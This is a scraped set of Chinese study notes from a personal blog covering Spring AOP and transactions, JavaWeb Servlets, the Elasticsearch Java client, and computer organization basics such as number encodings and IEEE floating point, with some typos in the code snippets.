代理模式：\n在调用目标方法时，不直接调用，而是通过代理类调用\n代理：将非核心逻辑剥离出来以后，封装这些非核心逻辑的类、对象、方法\n目标：代理“套用\u0026quot;了非核心逻辑代码的类、对象、方法\n优化：\n静态代理：再创建一个代理类，实现其他方法，再调用原有类\n问题：还是僵化，无法动态调整 动态代理：创建动态代理对象 ProxyFactory，用反射统一管理\nAOP：通过预编译和动态代理，在不修改程序源码情况下，给程序添加功能\n抽取横切关注点\n整合横切关注点为通知方法\n将各种通知方法整合为切面类\n基于注解实现 分类：\nJDK：代理对象和目标对象实现相同接口（目标有接口时）\ncglib：通过继承目标类\nAspectJ：基于静态代理，将代理逻辑植入编译的字节码文件，效果是动态的，Spring借助了其中的注解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 @Aspect//切阻尖 @Component //ioc容器 public class LogAspect { //设置切入点和通知类型 //通知类型： //前置 @Before(value = \u0026#34;切入点表达式\u0026#34;) public void beforeMethod(JoinPoint joinPoint) { StringmethodName = joinPoint.getSignature().getName(); Object[] args = jqinPoint.getArgs(); // 获取连接点的信息 } //返回 @AfterReturning //异常 @AfterThrowing //后置 @After() //环绕 @Around() } @Order 控制切面优先级\n基于 xml 实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;context:component-scanbase-package=\u0026#34;com.atguigu.aop.xml\u0026#34;\u0026gt;\u0026lt;/context:component-scan\u0026gt; \u0026lt;aop:config\u0026gt; \u0026lt;!--配置切面类--\u0026gt; \u0026lt;aop:aspect ref=\u0026#34;loggerAspect\u0026#34;\u0026gt; \u0026lt;aop:pointcut id=\u0026#34;pointcut\u0026#34; expression=\u0026#34;execution(*com.atguigu.aop.xml.calculatorImpl.*(..))\u0026#34;/\u0026gt; \u0026lt;aop:before method=\u0026#34;beforeMethod\u0026#34;pointcut-ref=\u0026#34;pointcut\u0026#34;\u0026gt;\u0026lt;/aop:before\u0026gt; \u0026lt;aop:after method=\u0026#34;afterMethod\u0026#34;pointcut-ref=\u0026#34;pointcut\u0026#34;\u0026gt;\u0026lt;/aop:after\u0026gt; \u0026lt;aop:after-returning method=\u0026#34;afterReturningMethod\u0026#34;returning=\u0026#34;result\u0026#34;pointcut- ref=\u0026#34;pointcut\u0026#34;\u0026gt;\u0026lt;/aop:after-returning\u0026gt; \u0026lt;aop:after-throwing method=\u0026#34;afterThrowingMethod\u0026#34;throwing=\u0026#34;ex\u0026#34;pointcut- ref=\u0026#34;pointcut\u0026#34;\u0026gt;\u0026lt;/aop:after-throwing\u0026gt; \u0026lt;aop:around method=\u0026#34;aroundMethod\u0026#34;pointcut-ref=\u0026#34;pointcut\u0026#34;\u0026gt;\u0026lt;/aop:around\u0026gt; \u0026lt;/aop:aspect\u0026gt; \u0026lt;/aop:config\u0026gt; 事务 JDBC Template 增：\n1 2 3 4 5 6 7 //1添加操作 //第一步编写sqL语句 String Sql = \u0026#34;INSERT INTO t_emp VALUES(NULL,?,?,?)\u0026#34;;I //第二步调用jdbcTempLate的方法，传入相关参数 //Object[］ params ={\u0026#34;东方不败\u0026#34;，20，\u0026#34;未知\u0026#34;}; //int rows = jdbcTemplate.update(sql,params); int rows = jdbcTemplate.update(sql, ..args:\u0026#34;东方不败\u0026#34;，20，\u0026#34;未知\u0026#34;); 改：\n1 2 3 //2修改操作 String sql =\u0026#34;update t_emp set name=? where id=?\u0026#34;; int rows =jdbcTemplate.update(sql, ..args: \u0026#34;林平之atguigu\u0026#34;,3）; 删：\n1 2 3 //3删除操作 String sql\u0026#39;deletefromt_empwhere id=?\u0026#34;; introws=jdbcTemplate.update(sql, ..args: 3); 查：\n1 2 3 4 5 public void testSelectObject() { String sql=\u0026#34;select*from t_emp List\u0026lt;Emp\u0026gt;list = jdbcTemplate.query(sql, new BeanPropertyRowMapper\u0026lt;\u0026gt;(Emp.class)); } 基于注解的声明式事务 保证事务的一致性、隔离性、持久性、原子性\nTransactional 标签声明事务，可以设置：\n只读 超时 回滚策略，哪些异常不回滚 隔离级别 传播行为，事务方法之间调用的处理逻辑 全注解 不用 XML，改用配置类\n","date":"2025-10-10T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-spring/","title":"Spring"},{"content":"Tomcat 服务器容器，将服务部署（deploy）到容器内\n目录结构：\nbin 可执行文件目录 conf 配置文件目录 webapps 项目部署的目录 项目内容存放到 webapps-name-WEBINF 文件夹下，即可访问 work 工作目录 Servlet 获取参数 在 web.xml 中定义 servlet-mapping，指定接收 url 请求对应的类 现在支持注解注册 @WebServlet(\u0026quot;\\...\u0026quot;) 定义类，继承 HttpServlet ，实现 doPost 方法 再调用 DAO、DAOImpl 更改数据库 继承关系 Servlet 接口\nvoid init（config） 初始化方法\nvoid service(request,response) 服务方法 （收到请求自动调用）\nvoid destory() 销毁方法\nServlet 父类、抽象类\ngenericServlet 抽象类，用于处理子类没有实现的方法（抛错误） httpServlet 实现类，具体处理逻辑 生命周期 默认情况下：\n第一次接收请求时，这个servlet会进行实例化（调用构造方法）、初始化（调用init())）、然后服务（调用service()）\n默认只会有一个 Servlet 示例 单例的，线程不安全的 \u0026ndash;\u0026gt; 尽量不在 Servlet 中定义、修改成员变量 第二次请求开始，每一次都是服务\n当容器关闭时，其中的所有的 servlet 实例会被销毁，调用销毁方法\nHttp 协议 超文本传输协议，是无状态的\n请求内容\n请求行 方式、URL、HTTP版本 请求头 Host、Referer、Cookie…… 请求体 响应内容\n响应行 协议、状态码（200）、响应状态（ok） 响应消息头 Server、Content-type…… 响应体 Session 会话跟踪技术，解决 http 的无状态问题。\nrequest.getSession，获取、自动分配 Session\nsession.setAttribute，保存 session 作用域 服务器端内部转发和客户端重定向 内部转发：同一请求、不同服务组件之间转发处理\ngetdepatcher\u0026hellip; 重定向：返回客户端一个新的服务，使其重新请求\nredirect\u0026hellip; Thymeleaf 视图模板技术 辅助渲染从 DAO 获取的数据到前端\n引入模板 将查询的数据动态显示 th: if... unless... each... text...\n保存作用域 request：一次请求有效 session：一次会话范围有效 application：一次应用程序范围内有效（上下文） 小项目 编辑、修改特定信息\n变量的获取 url/(fid=${name.fid}) 跳转到编辑页面，获取数据 MVC Servlet优化 Servlet 整合 问题：\nServlet 组件过多 优化：\n将各种 Servlet 整合到一个 Controller 中，作为方法 用路径区分操作要求 通过 Switch ... case ... 进行跳转，执行 DAO 再用反射优化，this.getClass().getDeclaredMethods(); DispatcherServlet 中央控制器 抽取路径、反射代码 拦截、处理指定请求，修改路径再传输到 Controller\n将每个 Controller 的反射代码再抽取到父类\n注意，这样的 Controller 继承 DispatcherServlet，不能再自动调用 Init（），需要另外处理\n解析 xml 配置文件 定位指定 Controller 读取 bean 配置，整合为 map\u0026lt;id,object\u0026gt;，寻找指定方法 抽取重定向 Controller处理后，return 一个字符串，再交给 DispatcherServlet 处理\n抽取传入参数 获取参数的过程同一抽取到 DispatcherServlet\njdk 8 新特性，通过反射获取方法参数的方法名 将得到的参数拆包、赋值、类型转换后，再传递给 Controller 初始化 重写 init（）方法，通过注解或 xml，向初始化方法中添加参数\nService model：模型层 pojo/vo、DAO（数据访问对象，单精度方法）、BO（业务对象） 在 Controller 与 DAO 间添加 Service 层 controller：控制 view：视图 IOC 控制反转 实现 Bean 的自动装配，整理 xml 映射文件\n将解析出的实例创建并存放在 beanmap 中，beanmap 存放在 BeanFactory 中，改变示例生命周期（存放到 IOC 容器中），需要时取用即可 1 2 3 Field propertyField = beanClazz.getDeclaredField(propertyName); propertyField.setAccessible(true); propertyField.set(beanobj,refobj); Filter 过滤器 拦截请求、响应\n实现 Filter 接口，@WebFilter(\u0026quot;...\u0026quot;)\n改写 doFilter，后放行（执行 Service）filterchain.doFilter(...)\n接收到 Service 后，继续执行完 doFilter\n过滤器链\n执行顺序：根据全类名、xml 配置的顺序 事务管理 一个 Service 需要作为一个整体，操作多个数据库时要保证同时成功或失败\n将 try …… catch 放到 Filter 当中处理，统一回滚 用 ThreadLocal 来保证对象、线程（Connection）的同一性 OpenSessionInViewFilter 的实现 事务管理封装为 TransactionManager，实现开启、提交、回滚事务的方法\n本来分开的 commit、rollback 等，手动进行管理 注意内部不能 catch 异常，需要都交给 Filter 处理 或者 catch 为新的异常抛出 ThreadLocal 的实现源码 1 2 3 4 5 6 7 8 public void set(T value) Thread t=Thread.currentThread();//获取当前的线程 ThreadLocalMap map = getMap(t);//每一个线程都维护各自的一个容器(ThreadLocalMap) iff (map != null) map.set((this)value);//用map，支持多个对象存储 else createMap(t, value) ; } Listener 监听器 监听各种对象的创建、销毁；保存作用域的变化；对象在 Session 中的创建与移除、序列化与反序列化\n将 IOC 整合到 Listener 中（监听上下文启动），提前初始化，提高响应速度（减慢启动速度） QQZone 笔记 数据库 设计 先写出功能，再分析：\n抽取实体：用户登录信息、用户详情信息、日志、回贴、主人回复 分析其中属性 用户登录信息：账号、密码、头像、昵称 用户详情信息：真实姓名、星座、血型、邮箱、手机号 日志：标题、内容、日期、作者 回复：内容、日期、作者、日志 分析实体之间关系 一对一 or 一对多 or 多对多 范式 第一范式：列不可再分（空间尽量小）\n第二范式：一张表只表达一层含义\n第三范式：表中每一列和逐渐都是直接依赖关系（与多表连接查询权衡）\n根据数据库查询频次、量，调整规范性 主键尽量不与业务产生联系\n直接用自增组件 实体类 - POJO 定义对应属性，有关系的要对应\n1 2 private UserDetail userDetail//1:1 private List\u0026lt;Topic\u0026gt; topiqList//1:N 数据层 - DAO 接口、impl，实现查询\n业务层 - Service 接口、impl，整合 DAO 层\n","date":"2025-10-09T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-javaweb-servlet/","title":"JavaWeb-Servlet"},{"content":"初识 分布式的开源搜索引擎\n提供 Restful 接口，所有语言均可调用\nELK技术栈：\n结合 kibana（可视化）、Logstash、Beats 用于日志分析、事实监控等 倒排索引 正向索引：\n传统数据库使用，查询需要逐一遍历 倒排索引：\ndocument：文档，每条数据就是一个文档 term：词条，由文档按语义划分，有限且唯一 先搜词条，再根据词条找文档 IK分词器 作为 ES 插件导入\n根据现有词典（可拓展）对文档进行划分\n基础概念 索引库：\n相同类型的文档（Json存储）的集合 映射：\n索引库中对文档的约束 mapping 属性 type：字段数据类型\nindex：是否创建索引\nanalyzer：分词器\npropertis：嵌套的子字段\n索引库操作 RESTFUL 规范\n不同请求方式对应不同请请求类型 创建索引库和mapping的请求语法如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 PUT /索引库名称 { \u0026#34;mappings\u0026#34;: { \u0026#34;properties\u0026#34;: { \u0026#34;字段名1\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;analyzer\u0026#34;: \u0026#34;ik_smart\u0026#34; }, \u0026#34;字段名2\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;keyword\u0026#34;, \u0026#34;index\u0026#34;: \u0026#34;false\u0026#34; }, \u0026#34;字段名3\u0026#34;: { \u0026#34;properties\u0026#34;: { \u0026#34;子字段\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;keyword\u0026#34; } } }, // …略 } } } 支持 put、get、delete\n文档操作 新增文档：\n1 2 3 4 5 6 7 8 9 10 POST /索引库名/_doc/文档id { \u0026#34;字段1\u0026#34;: \u0026#34;值1\u0026#34;, \u0026#34;字段2\u0026#34;: \u0026#34;值2\u0026#34;, \u0026#34;字段3\u0026#34;: { \u0026#34;子属性1\u0026#34;: \u0026#34;值3\u0026#34;, \u0026#34;子属性2\u0026#34;: \u0026#34;值4\u0026#34; }, // … } 修改\nput 全量修改，先删除再新建 post 增量修改 批处理\n1 2 3 4 5 6 7 8 9 10 POST /_bulk { \u0026#34;index\u0026#34; : { \u0026#34;_index\u0026#34; : \u0026#34;索引库名\u0026#34;, \u0026#34;_id\u0026#34; : \u0026#34;1\u0026#34; } } { \u0026#34;字段1\u0026#34; : \u0026#34;值1\u0026#34;, \u0026#34;字段2\u0026#34; : \u0026#34;值2\u0026#34; } { \u0026#34;index\u0026#34; : { \u0026#34;_index\u0026#34; : \u0026#34;索引库名\u0026#34;, \u0026#34;_id\u0026#34; : \u0026#34;1\u0026#34; } } { \u0026#34;字段1\u0026#34; : \u0026#34;值1\u0026#34;, \u0026#34;字段2\u0026#34; : \u0026#34;值2\u0026#34; } { \u0026#34;index\u0026#34; : { \u0026#34;_index\u0026#34; : \u0026#34;索引库名\u0026#34;, \u0026#34;_id\u0026#34; : \u0026#34;1\u0026#34; } } { \u0026#34;字段1\u0026#34; : \u0026#34;值1\u0026#34;, \u0026#34;字段2\u0026#34; : \u0026#34;值2\u0026#34; } { \u0026#34;delete\u0026#34; : { \u0026#34;_index\u0026#34; : \u0026#34;test\u0026#34;, \u0026#34;_id\u0026#34; : \u0026#34;2\u0026#34; } } { \u0026#34;update\u0026#34; : {\u0026#34;_id\u0026#34; : \u0026#34;1\u0026#34;, \u0026#34;_index\u0026#34; : \u0026#34;test\u0026#34;} } { \u0026#34;doc\u0026#34; : {\u0026#34;field2\u0026#34; : \u0026#34;value2\u0026#34;} } DSL 查询 分类：\n叶子查询：特定字段查询特定值 复合查询：逻辑方式组合叶子查询 基本语法：\n1 2 3 4 5 6 7 8 GET /indexName/_search { \u0026#34;query\u0026#34;: { \u0026#34;查询类型\u0026#34;: { \u0026#34;查询条件\u0026#34;: \u0026#34;条件值\u0026#34; } } } 叶子 全文检索：分词 match 查询 mult_match 允许同时查询多个字段 精确查询：不分词，直接精确匹配 term 查询，整体到词条中寻找 range 地理查询：用于搜索地理位置 复合 基于逻辑运算组合叶子 bool：子句must、should、must_not、filer 基于算法修改查询时的文档相关性算分，从而改变排名 function_score dis_max 排序和分页 排序：\n添加 sort 标签，默认按照 _score 排序 分页：\n添加 from 、size 深度分页问题： es 一般对数据进行分片存储，导致查询数据时需要汇总各个分片的数据 解决方案：\nsearch after，分页时需要排序，每次查询从上一次的排序值开始。但只能向后逐页查询 scrool，将排序数据形成快照，保存在内存 设置上限 高亮显示 在搜索结果中把搜索关键字突出显示\nfield标签加上pre_tags、post_tags Java 客户端 JavaRestClient\n初始化 1 2 3 RestHighLevelClient client = new RestHighLevelClient(RestClient.builder( HttpHost.create(\u0026#34;http://192.168.150.101:9200\u0026#34;) )); Mapping 映射 结合业务分析所需字段（区分是否需要和是否搜索）\n搜索字段 排序字段 展示字段 索引库操作 基于 RestFul格式：\n1 2 3 4 5 6 7 8 9 @Test void testCreateHotelIndex() throws IOException { // 1. 创建Request对象 CreateIndexRequest request = new CreateIndexRequest(\u0026#34;items\u0026#34;); // 2. 请求参数，MAPPING_TEMPLATE是静态常量字符串，内容是JSON格式请求体 request.source(MAPPING_TEMPLATE, XContentType.JSON); // 3. 发起请求 client.indices().create(request, RequestOptions.DEFAULT); } 文档操作 新增文档的 API\n1 2 3 4 5 6 7 8 9 @Test void testIndexDocument() throws IOException { // 1. 创建request对象 IndexRequest request = new IndexRequest(\u0026#34;indexName\u0026#34;).id(\u0026#34;1\u0026#34;); // 2. 准备JSON文档 request.source(\u0026#34;{\\\u0026#34;name\\\u0026#34;: \\\u0026#34;Jack\\\u0026#34;, \\\u0026#34;age\\\u0026#34;: 21}\u0026#34;, XContentType.JSON); // 3. 发送请求 client.index(request, RequestOptions.DEFAULT); } 文档批处理 add 多个 index，然后统一请求即可\n完成批量导入数据 1 2 3 4 5 6 7 8 9 10 11 void testBulk() throws IOException { // 1. 创建Bulk请求 BulkRequest request = new BulkRequest(); // 2. 添加要批量提交的请求：这里添加了两个新增文档的请求 request.add(new IndexRequest(\u0026#34;indexName\u0026#34;) .id(\u0026#34;101\u0026#34;).source(\u0026#34;json source\u0026#34;, XContentType.JSON)); request.add(new IndexRequest(\u0026#34;indexName\u0026#34;) .id(\u0026#34;102\u0026#34;).source(\u0026#34;json source2\u0026#34;, XContentType.JSON)); // 3. 发起bulk请求 client.bulk(request, RequestOptions.DEFAULT); } 准备文档数据\n准备请求参数\n发送请求\nRTL 查询 SearchRequest 对象，发请求\n解析结果\n得到 Hits 属性，结果是数组\n复合、排序、分页 用指定对象、设置指定参数即可\nboolquery、source\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @Test void testBool() throws IOException { // 1.创建Request SearchRequest request = new SearchRequest(\u0026#34;items\u0026#34;); // 2.组织请求参数 // 2.1.准备bool查询 BoolQueryBuilder bool = QueryBuilders.boolQuery(); // 2.2.关键字搜索 bool.must(QueryBuilders.matchQuery(\u0026#34;name\u0026#34;, \u0026#34;脱脂牛奶\u0026#34;)); // 2.3.品牌过滤 bool.filter(QueryBuilders.termQuery(\u0026#34;brand\u0026#34;, \u0026#34;德亚\u0026#34;)); // 2.4.价格过滤 bool.filter(QueryBuilders.rangeQuery(\u0026#34;price\u0026#34;).lte(30000)); request.source().query(bool); // 3.发送请求 SearchResponse response = client.search(request, RequestOptions.DEFAULT); // 4.解析响应 handleResponse(response); } 分页：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 @Test void testPageAndSort() throws IOException { int pageNo = 1, pageSize = 5; // 1.创建Request SearchRequest request = new SearchRequest(\u0026#34;items\u0026#34;); // 2.组织请求参数 // 2.1.搜索条件参数 request.source().query(QueryBuilders.matchQuery(\u0026#34;name\u0026#34;, \u0026#34;脱脂牛奶\u0026#34;)); // 2.2.排序参数 request.source().sort(\u0026#34;price\u0026#34;, SortOrder.ASC); // 2.3.分页参数 request.source().from((pageNo - 1) * pageSize).size(pageSize); // 3.发送请求 SearchResponse response = client.search(request, RequestOptions.DEFAULT); // 4.解析响应 handleResponse(response); } 高亮：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @Test void testHighlight() throws IOException { // 1.创建Request SearchRequest request = new SearchRequest(\u0026#34;items\u0026#34;); // 2.组织请求参数 // 2.1.query条件 request.source().query(QueryBuilders.matchQuery(\u0026#34;name\u0026#34;, \u0026#34;脱脂牛奶\u0026#34;)); // 2.2.高亮条件 request.source().highlighter( SearchSourceBuilder.highlight() .field(\u0026#34;name\u0026#34;) .preTags(\u0026#34;\u0026lt;em\u0026gt;\u0026#34;) .postTags(\u0026#34;\u0026lt;/em\u0026gt;\u0026#34;) ); // 3.发送请求 SearchResponse response = client.search(request, RequestOptions.DEFAULT); // 4.解析响应 handleResponse(response); } 数据聚合 对文档数据进行统计、分析\n桶：对文档做而非女足 度量 Metric：计算某些特定值 管道 Pipeline：以其他聚合的结果为基础做聚合 DSL aggs 定义聚合\n1 2 3 4 5 6 7 8 9 10 11 12 13 GET /items/_search { \u0026#34;query\u0026#34;: {\u0026#34;match_all\u0026#34;: {}}, // 可以省略 \u0026#34;size\u0026#34;: 0, // 设置size为0，结果中不包含文档，只包含聚合结果 \u0026#34;aggs\u0026#34;: { // 定义聚合 \u0026#34;cateAgg\u0026#34;: { // 给聚合起个名字 \u0026#34;terms\u0026#34;: { // 聚合的类型，按照品牌值聚合，所以选择term \u0026#34;field\u0026#34;: \u0026#34;category\u0026#34;, // 参与聚合的字段 \u0026#34;size\u0026#34;: 20 // 希望获取的聚合结果数量 } } } } RestClient 构造聚合 指定名称、类型、字段\n1 2 3 4 5 6 7 request.source().size(0); request.source().aggregation( AggregationBuilders .terms(\u0026#34;brand_agg\u0026#34;) .field(\u0026#34;brand\u0026#34;) .size(20) ); ","date":"2025-10-04T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-elasticsearch/","title":"ElasticSearch"},{"content":" tags: [\u0026ldquo;笔记\u0026rdquo;] 第一章 计算机系统概述 计算机系统的发展 计算机系统 = 硬件 + 软件\n软件 系统软件：用来管理整个计算机系统\n应用软件：按任务需要编制成的程序\n硬件 第一台电子数字计算机：ENIAC\n逻辑元件（用于处理电信号的最小单元）：电子管\n十进制表示，手动编程\n无冯 · 诺伊曼结构\n第二代：晶体管\n元器件：逻辑元件（晶体管），内存（磁芯），外存（磁鼓，磁带） 特点：变址，浮点运算，多路存储器，I/O 处理机，中央交换结构（非总线）。 软件：使用高级语言，提供系统软件。 第三代：中小规模集成电路\n元器件：逻辑元件和主存储器均由集成电路实现。 特点：微程序控制，Cache，虚拟存储器，流水线。 代表机种：IBM 360（大型机），DEC PDP-8（小型机），巨型机。 IBM 360（兼容机）\n相同/相似的指令集\u0026amp;操作系统。\n好处： 原来机器上的程序可以不改动而在新机器上运行，但性能不同。\n保持兼容的关键：低端机指令集是高端机的一个子集，称为“向后兼容”。\nDEC PDP-8（采用总线结构）\n总线结构好处：可扩充性好（允许将新的符合标准的模块插入总线，形成各种配置），节省器件，体积小，价格便宜\n第四代：大规模、超大规模集成电路\n半导体存储器，微处理器发展迅速。 特点：共享存储器，分布式存储器以及大规模并行系统。 组成 冯诺依曼结构模型 冯诺依曼提出存储程序，取代手动接线。\n冯诺依曼结构：\n计算机由运算器，控制器，存储器，输入设备和输出设备五个基本部件组成。 各基本部件功能： 存储器不仅能存放数据，而且也能存放指令，形式上两者没有区别，但计算机应能区分数据还是指令； 控制器应能自动执行指令； 运算器应能进行加/减/乘/除四种基本算术运算，并且也能进行一些逻辑运算和附加运算； 操作人员可以通过输入设备和输出设备与主机进行通信。 内部以二进制数表述指令和数据 每条指令由操作码和地址码两部分组成。操作码指出操作的类型，地址码指出操作数的地址。 由一串指令组成程序。 采用存储程序工作方式 将事先编好的程序和原始数据送入主存中；启动执行后，在不需操作人员干预下，自动完成逐条取出指令和执行指令的任务。 基本部件及其功能 运算器（数据运算）：ALU、GPRs、标志寄存器等。 存储器（数据存储）：存储阵列、地址译码器、读写控制电路 总线（数据传送）：数据线（MDR）、地址线（MAR）和控制线 控制器（控制）：对指令译码生成控制信号 CPU = 运算器 + 控制器\n主机 = CPU + 主存\n各硬件工作原理 主存储器 主存储器 = 存储体 + MAR + MDR\nMemory Address Register 存储地址寄存器：指示位置，位数反应存储单元的个数 Memory Data Register 存储数据寄存器：指示存入、取出的具体数据（包括指令） 存储体：数据、指令在存储体内按地址存储，每个存储单元对应一个地址 1B = 1 byte ; 1 b = 1 bit\nMAR、MDR 逻辑上属于主存，但被集成到 CPU\n运算器 实现算数运算、逻辑运算\n运算器 = ACC + ALU + MQ + X\nAccumulator：累加器，存放操作数或运算结果 Multiple-Quotient Register：乘商寄存器，乘除运算时，存放操作数或运算结果 Arithmetic and Logic Unit：算数逻辑单元，通过复杂电路实现算数运算、逻辑运算 X：通用的操作数寄存器，用于存放操作数 控制器 控制器 = CU + IR +PC\nControl Unit:控制单元，分析指令，给出控制信号\nInstruction Register:指令寄存器，存放当前执行的指令\nProgram Counter:程序计数器，存放下一条指令地址，有自动加1功能\n配合 指令和数据 程序启动前，指令和数据都存储在存储器中，形式上没有区别，都是 0/1 序列。 采用存储程序的工作方式，程序由指令组成，启动后计算机自动取出一条条指令并执行，无需人的干预。 指令执行过程中，指令和数据从存储器取到 CPU，指令存在 IR 中，数据在 GPR 中。 指令需要给出的信息 操作码：指令的操作，加减法等 一个或多个源操作数：立即数、寄存器编号、存储地址 目的操作数地址：寄存器编号、存储地址 执行过程 程序执行前 数据和指令事先存放在存储器中，每条指令和每个数据都有地址，指令按序存放。指令由 OP、ADDR 字段组成，程序起始地址送入 PC。 开始执行程序 根据 PC 取指令送 IR：PC -\u0026gt; MAR -\u0026gt;存储器 -\u0026gt; MDR -\u0026gt; IR 指令译码：IR -\u0026gt; 控制器，控制器译码 取操作数：GPRs 或存储器 -\u0026gt; ALU 执行指令操作：ALU 运算 回写结果到 GPRs 或存储器 修改 PC 的值，使其指向下一条指令 重复上述步骤直到程序完成 软件 系统软件——简化编程，使硬件资源被有效利用 操作系统：硬件资源管理，用户接口 语言处理程序：翻译程序，Linker，Debug\u0026hellip; 翻译程序 汇编器（Assembler）：汇编语言源程序-\u0026gt;机器目标程序。或许叫汇编器更好理解？ 编译器（Complier）：高级语言程序-\u0026gt;汇编/机器目标程序。或许叫编译器更好理解？ 解释器（Interpreter）：将高级语言程序语句逐条翻译成机器指令并执行，不生成目标文件。（跳过汇编阶段） 其他实用程序：磁盘碎片整理、备份程序\u0026hellip; 机器语言：二进制代码\n汇编语言：助记符\n高级语言：C、C++、……\n应用软件——解决具体的应用问题 层次结构 语言层次 微指令系统：直接控制硬件执行 机器语言：传统机器M1，执行二进制机器指令 操作系统机器\n汇编语言：虚拟机器M2，用汇编语言翻译成机器语言\n高级语言：虚拟机器M3，需要编译成汇编、机器语言\n上两层视为硬件层\n计算机体系结构：讨论如何设计硬件与软件之间的接口\n计算机组成原理：讨论如何用硬件实现接口\nISA 指令集体系结构，其作为规约，规定了如何使用硬件。\n可执行的指令集合，包括指令格式、操作种类以及对应操作数的规定。 可以接受的操作数类型。 操作数存放的寄存器组结构，例如寄存器名称、编号、长度和用途。 操作数存放的存储空间的大小和编址方式。 操作数在存储空间中按大/小端方式存放。 指令获得操作数的方式，即寻址方式。 指令执行过程的控制方式，例如程序计数器，条件码定义等。 ISA 是计算机系统中必不可少的抽象层。\n性能指标 存储器 总容量 = 存储单元个数 * 存储字长(bit)\nCPU 基本概念 主频：CPU内数字脉冲信号振荡的频率\n= 1 / 时钟周期 CPI：执行一条指令需要多少个时钟周期（不同指令，CPI不同）\nCPU执行时间：执行整个程序的耗时 = (条数 * CPI) / 主频\nIPS：每秒执行多少个命令 = 主频 / 平均CPI\nFLOPS：每秒执行多少次浮点运算\nK=Kilo=千=10^3\nM=Million=百万=10^6\nG=Giga=十亿=10^9\nT=Tera=万亿=10^12\n数据通路带宽：数据总线一次所能并行传送信息的位数（各硬件部件通过数据总线传输数据）\n吞吐量：单位时间内处理请求的数量\n相应时间：CPU时间 + 等待时间\n基准程序：用于测量的程序\nMIPS（Million Instructions Per Second）：每秒执行多少百万条指令，着重点在于单条指令。\nMIPS 为平均值，其并没有考虑以上三个属性，并且由于：\n不同机器指令集不同 程序由不同指令混合而成 指令的频率会动态变换 厂家给出峰值 MIPS 因此，MIPS 表示性能存在局限性。\nMFLOPS：每秒执行浮点运算多少百万次，着重在于浮点操作本身。\n计算 CPU 执行时间=CPI×程序总指令条数×时钟周期\n第二章 数据的机器级表示 信息二进制编码 计算机内部数据：二进制表示\n机器级数据：\n数值数据，无符号/带符号整数，浮点数，十进制数 非数值数据，逻辑数，汉字 二进制编码原因：\n制造两个稳态的物理器件容易 二进制编码、计数、运算规则简单。 与逻辑命题对应，便于逻辑运算，方便地用逻辑电路实现算术运算。 机器数：0/1 编码的 0/1 内部 0/1 序列。\n真值：机器数真正的值\n数值数据表示方法 三要素：\n进位计数制：十进制，二进制等转换。 定点浮点表示：定点整数/小数；浮点数（使用一个定点小数和一个定点整数表示） 编码：原码补码反码等。 若不知道三要素，那么便无法得知机器数的具体真值。\n进制转换：\n二进制 -\u0026gt; 其他：划分位数，对应 十六、八 -\u0026gt; 二：位数对应，补全 十进制 -\u0026gt; 任意位数：求商取余 定点数的表示 常规计数，小数点位置固定。整数、小数分开存储。\n无符号数：没有符号位\n原码：\n有 +0、-0 两种表示形式 反码：\n正数与原码相同 若符号位为1，则数值位全部取反 依然有 +0、-0 补码：\n将减法抓换为等价的加法（加上补数） = 原码除符号位外，取反后加一（即反码 + 1） 移码： 将每一个数值加上一个偏置常数（ bias）\n一般来说，当编码位数为 n **时，bias 取 2^n 标准移码\n为什么要用移码来表示阶码？\n便于浮点数加减运算时的对阶操作（比较大小）\n与补码的关系：最高位相反，其余位相同\nC语言的解析 无符号数变为有符号：不改变数据内容，改变解释方式\n长变短：高位截断，保留地位\n短变长：符号扩展\n负数补1，正数补0 IEEE编码 规定了二进制浮点数算数标准，类似科学计数法简化计数\n二进制浮点数 符号：决定数值的正负性\n尾数：影响数值的精度。尾数的位数越多，精度越高\n阶码：反映小数点的实际位置\n基数：K进制通常默认基数为K\n规格化：石确保尾数的最高位非0数位刚好在小数点之前\nfloat型：32位单精度\n符号 + 阶码 + 尾数：1 + 8 + 23 double型：64位双精度\n符号 + 阶码 + 尾数：1 + 11 + 52 float单精度 默认存储规格化尾数，小数点前的1省略（隐含）\n基数规定为 2\n阶码用移码表示，规定偏置值为 127\n如何将十进制真值转换为偏置值为M的移码？\n将十进制真值+偏置值\n按“无符号整数”规则转换为指定位数\ndouble双精度 偏置值为1023 表示范围 特殊状态 阶码全 0，或阶码全 1\n阶码真值的取值范围为 -126 ~ 127（单精度） 根据数轴，存在：\n正上溢、正下溢、负上溢，负下移 上溢置为无穷，下溢置为0 数据表示 十进制数表示 ASCII 码：就是把数字当作字符存储，0-9用30H-39H表示\n前分隔：正号用 2B 负号用 2D 放在最前面 后嵌入：将符号嵌入最低位数字的 ASCII 码高 4 位中。 正数不变；负数高 4 位变为 0111。 BCD 码\n每 1 位十进制数用 4 位二进制表示。而 4 位二进制数可组合成 16 种状态，只需要选 10 种状态来表示十进制数。 西文字符表示： 复习要点中未提到\n十进制数字：0/1/2…/9 10 个 英文字母：A/B/…/Z/a/b/…/z 52 个 专用符号：+/-/%/*/\u0026amp;/…… 33 个 控制字符（不可打印或显示） 33 个 汉字表示 输入码：用于输入汉字。 内码：用于在系统中进行存储、查找、传送等处理 字模点阵或轮廓描述：用于显示/打印 数据的宽度 bit 字节： 现代计算机中，存储器按字节编址 字节是最小可寻址单位 （addressable unit ） LSB 表示最低有效字节，MSB 表示最高有效字节 字 表示被处理信息的单位，用来度量数据类型的宽度 字长 指某特定机器定点运算时数据通路的宽度。 数据通路： CPU 内部进行数据运算、存储和传送的路径以及路径上的部件。 等于 CPU 内部总线的宽度，或运算器的位数，或通用寄存器的宽度。 数据的存储和排列顺序 大小端 小端（ Little Endian）:低字节放低地址 大端（ Big Endian）:高字节放低地址 指令中，操作码和寄存器号的存放顺序不变，只需要考虑立即数的顺序 